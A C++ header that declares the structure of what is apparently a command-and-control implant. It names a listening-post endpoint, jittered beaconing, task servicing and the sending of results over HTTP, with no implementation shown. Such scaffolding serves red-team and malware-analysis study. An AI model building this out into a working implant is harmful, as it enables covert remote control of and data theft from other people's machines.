#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>

#include <boost/property_tree/ptree.hpp>

struct Implant {
	// Our implant constructor
	Implant(std::string host, std::string port, std::string uri);
	// The thread for servicing tasks
	std::future<void> taskThread;
	// Our public functions that the implant exposes
	void beacon();
	void setMeanDwell(double meanDwell);
	void setRunning(bool isRunning);
	void serviceTasks();

private:
	// Listening post endpoint args
	const std::string host, port, uri;
	// Variables for implant config, dwell time and running status
	std::exponential_distribution<double> dwellDistributionSeconds;
	std::atomic_bool isRunning;
	// Define our mutexes since we're doing async I/O stuff
	std::mutex taskMutex, resultsMutex;
	// Where we store our results
	boost::property_tree::ptree results;
	// Where we store our tasks
	std::vector<Task> tasks;
	// Generate random device
	std::random_device device;

	void parseTasks(const std::string& response);
	[[nodiscard]] std::string sendResults();
};

[[nodiscard]] std::string sendHttpRequest(std::string_view host,
	std::string_view port,
	std::string_view uri,
	std::string_view payload);
